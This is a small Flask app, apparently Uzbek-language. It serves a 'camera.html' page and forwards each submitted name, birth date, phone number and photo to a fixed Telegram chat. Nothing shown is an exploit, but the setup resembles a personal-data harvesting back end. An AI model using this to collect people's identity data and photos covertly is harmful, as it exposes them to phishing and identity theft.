import os
import requests
from flask import Flask, request, render_template

app = Flask(__name__)

BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 1190566388))

@app.route('/')
def index():
    return render_template('camera.html')  # 'page' emas, '/' dan ishlaydi

@app.route('/submit', methods=['POST'])
def submit():
    full_name = request.form.get('full_name')
    birth_date = request.form.get('birth_date')
    phone = request.form.get('phone')
    photo = request.files.get('photo')

    caption = f"👤 Ism: {full_name}\n📅 Tug'ilgan sana: {birth_date}\n📞 Tel: {phone}"

    if photo:
        photo_path = "temp_photo.jpg"
        photo.save(photo_path)
        with open(photo_path, 'rb') as f:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
                data={'chat_id': ADMIN_ID, 'caption': caption},
                files={'photo': f}
            )
        os.remove(photo_path)
    else:
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            data={'chat_id': ADMIN_ID, 'text': caption}
        )

    return "Ma'lumotlar yuborildi. Rahmat!"

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))